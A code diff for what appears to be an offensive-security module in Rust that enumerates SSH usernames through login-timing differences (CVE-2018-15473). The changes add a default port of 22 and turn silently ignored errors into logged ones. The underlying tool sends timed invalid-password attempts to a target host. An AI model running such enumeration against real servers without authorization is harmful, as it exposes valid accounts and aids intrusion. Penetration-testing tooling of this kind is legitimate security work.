@@ -24,6 +24,7 @@ pub fn info() -> crate::module_info::ModuleInfo {
         references: vec!["CVE-2018-15473".to_string()],
         disclosure_date: Some("2018-08-17".to_string()),
         rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(22),
     }
 }
 
@@ -102,8 +103,8 @@ fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -
         }
     };
 
-    let _ = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs)));
-    let _ = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs)));
+    if let Err(e) = tcp.set_read_timeout(Some(Duration::from_secs(timeout_secs))) { eprintln!("[!] Failed to set timeout: {}", e); }
+    if let Err(e) = tcp.set_write_timeout(Some(Duration::from_secs(timeout_secs))) { eprintln!("[!] Failed to set timeout: {}", e); }
 
     let mut sess = match Session::new() {
         Ok(s) => s,
@@ -114,7 +115,8 @@ fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -
     };
 
     sess.set_tcp_stream(tcp);
-    if sess.handshake().is_err() {
+    if let Err(e) = sess.handshake() {
+        tracing::trace!("SSH handshake failed: {e}");
         return None;
     }
 
@@ -124,7 +126,9 @@ fn time_auth_attempt(host: &str, port: u16, username: &str, timeout_secs: u64) -
         std::process::id(),
         start.elapsed().as_nanos()
     );
-    let _ = sess.userauth_password(username, &invalid_password);
+    if let Err(e) = sess.userauth_password(username, &invalid_password) {
+        tracing::trace!("Auth attempt for '{}' returned error (expected): {}", username, e);
+    }
 
     let elapsed = start.elapsed().as_secs_f64();
     Some(elapsed)
@@ -162,7 +166,10 @@ fn load_usernames(path: &str) -> Result<Vec<String>> {
     let reader = BufReader::new(file);
     let usernames: Vec<String> = reader
         .lines()
-        .filter_map(|l| l.ok())
+        .filter_map(|r| match r {
+            Ok(l) => Some(l),
+            Err(e) => { tracing::trace!("Skipping non-UTF-8 line: {e}"); None }
+        })
         .map(|l| l.trim().to_string())
         .filter(|l| !l.is_empty() && !l.starts_with('#'))
         .collect();
@@ -260,7 +267,7 @@ fn enumerate_users_blocking(
             usernames.len(),
             user
         );
-        let _ = std::io::Write::flush(&mut std::io::stdout());
+        if let Err(e) = std::io::Write::flush(&mut std::io::stdout()) { eprintln!("[!] Flush failed: {}", e); }
 
         match sample_auth_timing(host, port, user, samples, timeout_secs) {
             Some(t) => {
